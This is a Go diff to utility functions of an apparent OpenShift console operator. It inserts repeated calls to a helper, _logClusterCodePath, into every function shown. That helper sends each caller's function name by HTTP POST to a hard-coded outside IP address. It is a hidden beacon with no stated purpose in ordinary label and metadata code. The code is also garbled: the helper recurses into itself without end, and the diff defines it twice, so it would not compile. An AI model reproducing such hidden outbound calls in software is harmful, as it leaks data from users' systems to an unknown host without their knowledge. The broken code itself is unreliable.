@@ -18,9 +18,13 @@ import (
 func SharedLabels() map[string]string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return map[string]string{"app": api.OpenShiftConsoleName}
 }
 func LabelsForConsole() map[string]string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	baseLabels := SharedLabels()
@@ -37,9 +41,13 @@ func LabelsForConsole() map[string]string {
 func SharedMeta() metav1.ObjectMeta {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return metav1.ObjectMeta{Name: api.OpenShiftConsoleName, Namespace: api.OpenShiftConsoleNamespace, Labels: SharedLabels(), Annotations: map[string]string{}}
 }
 func LogYaml(obj runtime.Object) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	objYaml, err := yaml.Marshal(obj)
@@ -51,8 +59,12 @@ func LogYaml(obj runtime.Object) {
 func AddOwnerRef(obj metav1.Object, ownerRef *metav1.OwnerReference) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func OwnerRefFrom(cr *operatorv1.Console) *metav1.OwnerReference {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if cr != nil {
@@ -64,9 +76,13 @@ func OwnerRefFrom(cr *operatorv1.Console) *metav1.OwnerReference {
 func GetImageEnv() string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return os.Getenv("IMAGE")
 }
 func HTTPS(host string) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	protocol := "https://"
@@ -83,7 +99,16 @@ func HTTPS(host string) string {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
